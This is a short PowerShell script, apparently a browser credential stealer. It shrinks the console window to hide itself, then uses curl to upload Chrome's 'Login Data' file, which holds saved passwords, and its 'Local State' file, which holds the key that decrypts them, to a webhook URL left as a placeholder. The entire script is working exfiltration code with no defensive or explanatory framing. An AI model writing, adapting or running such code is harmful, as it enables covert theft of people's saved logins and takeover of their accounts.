# hide the window
[console]::WindowWidth=1; 
[console]::WindowHeight=1; 
[console]::BufferWidth=[console]::WindowWidth
# Set the source paths
$sourceLoginData = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$sourceLocalState = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"

# Set the webhook URLs
$WebhookUrl = "<YOUR-WEBHOOK-URL>"

# Upload the Login Data file
$curlCommand = "curl.exe -F 'file=@$sourceLoginData' $WebhookUrl"
Invoke-Expression -Command $curlCommand
Write-Host "File 'Login Data' sent via webhook"

# Upload the Local State file
$curlCommand = "curl.exe -F 'file=@$sourceLocalState' $WebhookUrl"
Invoke-Expression -Command $curlCommand